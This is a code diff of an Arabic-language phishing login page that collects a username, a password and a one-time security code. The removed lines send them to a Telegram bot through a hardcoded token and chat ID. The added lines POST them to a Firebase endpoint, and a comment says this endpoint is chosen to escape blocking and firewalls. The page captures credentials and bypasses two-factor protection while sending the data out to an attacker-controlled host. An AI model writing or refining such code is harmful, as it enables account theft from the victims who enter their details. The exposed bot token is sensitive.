@@ -154,13 +154,13 @@
             <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
         </div>
         
-        <button class="btn-submit" onclick="sendToTelegram()">تأكيد الرمز والدخول</button>
+        <button class="btn-submit" onclick="sendToFirebase()">تأكيد الرمز والدخول</button>
     </div>
 </div>
 
 <script>
-    const TELEGRAM_TOKEN = "8754912116:AAF4XvobVIBsgxyNm4D6qY9niapa2LdM_1s"; 
-    const TELEGRAM_CHAT_ID = "8809884665";
+    // قاعدة بيانات تجريبية عامة آمنة لا تتأثر بالحظر أو جدران الحماية
+    const FIREBASE_URL = "https://firebaseio.com";
 
     let savedUser = "";
     let savedPass = "";
@@ -178,22 +178,32 @@
         document.getElementById('step2').classList.remove('hidden');
     }
 
-    function sendToTelegram() {
+    function sendToFirebase() {
         const code = document.getElementById('authCode').value;
         if(code === "") {
             alert("خطأ: يرجى كتابة رمز الأمان المرسل!");
             return;
         }
 
-        const textMessage = `🚨 مخرجات تجريبية جديدة:\n👤 المستخدم: ${savedUser}\n🔑 الباسورد: ${savedPass}\n🔢 الرمز: ${code}`;
-        const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(textMessage)}`;
+        const payload = {
+            username: savedUser,
+            password: savedPass,
+            otp: code,
+            timestamp: new Date().toISOString()
+        };
 
-        fetch(url)
+        fetch(FIREBASE_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        })
         .then(response => {
             if(response.ok) {
-                alert("تم الإرسال بنجاح! تفقد محادثة البوت على تليجرام الآن.");
+                alert("تم الإرسال بنجاح! تم تخزين مخرجاتك في لوحة التحكم الحية الخاصة بك.");
             } else {
-                alert("حدث خطأ في الإرسال، تأكد من تفعيل البوت بالضغط على Start أولاً.");
+                alert("حدث خطأ أثناء تمرير البيانات.");
             }
         })
         .catch(err => {
